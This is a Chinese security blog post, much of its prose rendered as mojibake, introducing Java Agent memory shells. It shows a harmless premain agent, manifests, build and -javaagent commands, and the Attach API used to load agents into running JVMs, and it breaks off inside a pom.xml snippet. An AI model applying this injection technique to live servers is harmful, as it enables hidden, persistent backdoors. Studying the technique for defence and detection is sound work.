

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <!-- ä¸­æ–‡å­—ä½“ï¼šéœé¹œæ–‡æ¥· Screen -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont/style.css">
   
  <!-- è‹±æ–‡å­—ä½“ï¼šInter -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">

  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&display=swap" rel="stylesheet">



  <!-- è‹±æ–‡å­—ä½“ Roboto Mono
  <!-- <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet"> -->

  <!-- ä¸­æ–‡å­—ä½“ éœé¹œæ–‡æ¥· -->
  <!-- <link href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" rel="stylesheet"> --> -->

  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
  <meta name="author" content="Xvsf">
  <meta name="keywords" content="">
  
    <meta name="description" content="Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬">
<meta property="og:type" content="article">
<meta property="og:title" content="Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬">
<meta property="og:url" content="http://xvshifu.github.io/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="Xvsf blogs">
<meta property="og:description" content="Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533461.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png">
<meta property="article:published_time" content="2025-11-08T07:03:00.000Z">
<meta property="article:modified_time" content="2025-11-08T11:05:23.707Z">
<meta property="article:author" content="Xvsf">
<meta property="article:tag" content="javaå®‰å…¨">
<meta property="article:tag" content="å†…å­˜é©¬">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬ - Xvsf blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/xm_custom/custom.css">
<link rel="stylesheet" href="/css/selection.css">
<link rel="stylesheet" href="/css/scrollAnimation.css">
<link rel="stylesheet" href="/css/border.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/Background.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":false,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 8.0.0"></head>





<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh; position: relative; overflow: hidden;">
  <!-- èƒŒæ™¯è§†é¢‘ -->
  <video autoplay muted loop id="bg-video">
    <source src="/videos/bg.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <!-- å¯¼èˆªæ å’Œ banner å†…å®¹ -->
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ–‹ï¸ Hello My Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/game/" target="_self">
                <i class="iconfont icon-steam"></i>
                <span>game</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-11-08 15:03" pubdate>
          2025å¹´11æœˆ8æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.9k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          66 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äº 2025å¹´11æœˆ8æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="Java-å†…å­˜é©¬ç¬¬å››ç¯‡-Agent-å†…å­˜é©¬"><a href="#Java-å†…å­˜é©¬ç¬¬å››ç¯‡-Agent-å†…å­˜é©¬" class="headerlink" title="Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬"></a>Java å†…å­˜é©¬ç¬¬å››ç¯‡ - Agent å†…å­˜é©¬</h1><h1 id="å››ã€-Java-Agent-å†…å­˜é©¬"><a href="#å››ã€-Java-Agent-å†…å­˜é©¬" class="headerlink" title="å››ã€ Java Agent å†…å­˜é©¬"></a>å››ã€ Java Agent å†…å­˜é©¬</h1><h2 id="4-1-Java-Agentç¤ºä¾‹"><a href="#4-1-Java-Agentç¤ºä¾‹" class="headerlink" title="4.1 Java Agentç¤ºä¾‹"></a>4.1 Java Agentç¤ºä¾‹</h2><p>å¯¹äºAgentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨<strong>JVMå¯åŠ¨å‰åŠ è½½çš„</strong><code>**premain-Agent**</code>ï¼Œå¦ä¸€ç§æ˜¯<strong>JVMå¯åŠ¨ä¹‹ååŠ è½½çš„</strong><code>**agentmain-Agent**</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg" srcset="/img/loading.gif" lazyload alt="premain-Agent"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg" srcset="/img/loading.gif" lazyload alt="agentmain-Agent"></p>
<h3 id="4-1-1-premain-Agent"><a href="#4-1-1-premain-Agent" class="headerlink" title="4.1.1 premain-Agent"></a>4.1.1 premain-Agent</h3><h4 id="ä½¿ç”¨å¤–éƒ¨-MANIFEST-MF-æ–‡ä»¶-åˆ›å»º"><a href="#ä½¿ç”¨å¤–éƒ¨-MANIFEST-MF-æ–‡ä»¶-åˆ›å»º" class="headerlink" title="ä½¿ç”¨å¤–éƒ¨ MANIFEST.MF æ–‡ä»¶ åˆ›å»º"></a>ä½¿ç”¨å¤–éƒ¨ MANIFEST.MF æ–‡ä»¶ åˆ›å»º</h4><h5 id="åˆ›å»ºJava-Agentç±»"><a href="#åˆ›å»ºJava-Agentç±»" class="headerlink" title="åˆ›å»ºJava Agentç±»"></a>åˆ›å»ºJava Agentç±»</h5><p>æ­¤å¤„ä¸å†™åŒ…åï¼Œé¿å…åç»­çš„ç¼–è¯‘çš„ jar åŒ…æ‰¾ä¸åˆ°ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.premain.agent;</span><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentPremain</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;premain-Agent&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>







<h5 id="åˆ›å»ºMANIFEST-MFæ–‡ä»¶"><a href="#åˆ›å»ºMANIFEST-MFæ–‡ä»¶" class="headerlink" title="åˆ›å»ºMANIFEST.MFæ–‡ä»¶"></a>åˆ›å»ºMANIFEST.MFæ–‡ä»¶</h5><p><strong>æœ€åå¿…é¡»æœ‰ä¸€ä¸ªç©ºè¡Œï¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Premain-Class: JavaAgentPremain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure>

<p>â€‹	</p>
<h5 id="åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº"><a href="#åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº" class="headerlink" title="åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº"></a>åˆ›å»ºæµ‹è¯•ä¸»ç¨‹åº</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.test;</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Agent!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Main-Class: HelloAgent<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure>





<h5 id="ç›®å½•ç»“æ„ï¼š"><a href="#ç›®å½•ç»“æ„ï¼š" class="headerlink" title="ç›®å½•ç»“æ„ï¼š"></a>ç›®å½•ç»“æ„ï¼š</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h5><p>åˆ›å»ºä¿©ä¸ªæ–‡ä»¶å¤¹ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>HelloAgent.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="åˆ›å»ºAgent-JARæ–‡ä»¶"><a href="#åˆ›å»ºAgent-JARæ–‡ä»¶" class="headerlink" title="åˆ›å»ºAgent JARæ–‡ä»¶"></a>åˆ›å»ºAgent JARæ–‡ä»¶</h5><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cfm ..\dist\agent.jar ..\src\main\resources\MANIFEST.MF JavaAgentPremain.<span class="hljs-keyword">class</span><br>jar cfm ..\dist\hello.jar ..\src\main\resources1\MANIFEST.MF HelloAgent.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="æµ‹è¯•è¿è¡Œ"><a href="#æµ‹è¯•è¿è¡Œ" class="headerlink" title="æµ‹è¯•è¿è¡Œ"></a>æµ‹è¯•è¿è¡Œ</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">javaagent:agent.jar </span>-<span class="hljs-keyword">jar </span>hello.<span class="hljs-keyword">jar</span><br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="4-1-2-agentmain-Agent"><a href="#4-1-2-agentmain-Agent" class="headerlink" title="4.1.2 agentmain-Agent"></a>4.1.2 agentmain-Agent</h3><p>agentmain-Agentèƒ½å¤Ÿåœ¨JVMå¯åŠ¨ä¹‹ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç åŠŸèƒ½ã€‚  </p>
<p>premainæ–¹æ³•åœ¨JDK1.5ä¸­æä¾›ï¼Œåœ¨JDKç‰ˆæœ¬ä¸º1.5æ—¶ï¼Œå¼€å‘è€…åªèƒ½åœ¨mainåŠ è½½ä¹‹å‰æ·»åŠ æ‰‹è„šï¼Œä½†æ˜¯å¯¹äºå¤§éƒ¨åˆ†å†…å­˜é©¬æ³¨å…¥æ—¶ï¼Œéƒ½æ˜¯JVMå·²ç»è¿è¡Œçš„æƒ…å†µä¸‹ã€‚åœ¨JDK1.6ä¸­å®ç°äº†attach-on-demandï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨AttachAPIåŠ¨æ€çš„åŠ è½½Agentï¼Œagentmainèƒ½å¤Ÿåœ¨JVMå¯åŠ¨ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç çš„åŠŸèƒ½ã€‚</p>
<p>AttachAPIåœ¨tool.jarä¸­ï¼Œè€ŒJVMå¯åŠ¨æ—¶é»˜è®¤ä¸åŠ è½½è¯¥ä¾èµ–ï¼Œéœ€è¦æˆ‘ä»¬åœ¨classpathä¸­é¢å¤–è¿›è¡ŒæŒ‡å®š</p>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>VirtualMachine å¯ä»¥å®ç°è·å– JVM ä¿¡æ¯ã€å†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰åŠŸèƒ½ã€‚</p>
<p>è¯¥ç±»å…è®¸æˆ‘ä»¬é€šè¿‡ç»™attachæ–¹æ³•ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œæ¥è¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¯¹è¿æ¥çš„JVMè¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚æ³¨å…¥Agentã€‚ä¸‹é¢æ˜¯è¯¥ç±»çš„ä¸»è¦æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š</span><br>VirtualMachine.attach()<br><span class="hljs-comment">//å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥ åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†</span><br>VirtualMachine.loadAgent()<br><span class="hljs-comment">//è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨</span><br>VirtualMachine.list()<br><span class="hljs-comment">//è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥</span><br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure>





<h4 id="VirtualMachineDescriptor-ç±»"><a href="#VirtualMachineDescriptor-ç±»" class="headerlink" title="VirtualMachineDescriptor ç±»"></a>VirtualMachineDescriptor ç±»</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>ç±»æ˜¯ä¸€ä¸ªç”¨æ¥æè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè·å–ç‰¹å®šè™šæ‹ŸæœºPIDçš„ç¤ºä¾‹</p>
<p>ç¤ºä¾‹ï¼š</p>
<p>pom.xml:</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39309402/article/details/102480878">Missing artifact com.sun:tools:jar:1.8.0æœ‰æ•ˆè§£å†³åŠæ³•ï¼ˆäº²æµ‹ï¼‰-CSDNåšå®¢</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.sun/tools --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0_451<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span 